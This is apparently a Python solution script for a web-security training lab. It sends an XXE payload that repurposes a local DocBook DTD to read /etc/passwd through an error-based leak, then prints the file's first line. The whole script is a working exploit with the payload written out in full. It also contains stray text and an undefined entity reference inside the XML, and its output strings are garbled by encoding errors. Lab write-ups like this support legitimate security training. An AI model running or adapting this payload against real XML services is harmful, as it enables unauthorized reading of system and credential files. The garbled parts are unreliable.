#########################################################################
#
# Lab: Exploiting XXE to retrieve data by repurposing a local DTD
#
# Hack Steps:
#      1. Repurpose a local DTD to retrieve the content of /etc/passwd
#      2. Extract the first line as a proof
#
#########################################################################
import requests
from colorama import Fore
import re

# Change this to your lab URL
LAB_URL = "https://0a18009a03ee88c481333e8a00c6006f.web-security-academy.net" 

def main():
    print("â¦—#â¦˜ Injection point: " + Fore.YELLOW + "Check stock request")
    print(Fore.WHITE + "â¦—2â¦˜ Repurposing a local DTD to retrieve the content of /etc/passwd.. ", end="", flush=True)

    payload = """<?xml version="1.0" encoding="UTF-8"?>
                            <!DOCTYPE foo [
                            <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
                            <!ENTITY % ISOamso '
                            <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
                            <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
                            &#x25;eval;
                            &#x25;error;
                            '>
                            %local_dtd;
                            ]>
                            <stockCheck>
                                <productId>
                                    &xxe;
                                </productId>
                                <storeId>
                                    1
                                </storeId>external entities
                                external entities
                            </stockCheck>"""
    headers = { "Content-Type": "application/xml" }
    
    try:
        injection = requests.post(f"{LAB_URL}/product/stock", data=payload, headers=headers)

    except:
        print(Fore.RED + "â¦—!â¦˜ Failed to check stock with the injected payload through exception")
        exit(1)
    
    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "â¦—2â¦˜ Extracting the first line as a proof.. ", end="", flush=True)
    
    first_line = re.findall("/(root:.*)\n", injection.text)[0]

    print(Fore.GREEN + "OK" + Fore.WHITE + " => " + Fore.YELLOW + first_line)
    print(Fore.WHITE + "ðŸ—¹ The lab should be marked now as " + Fore.GREEN + "solved")

if __name__ == "__main__":
    main()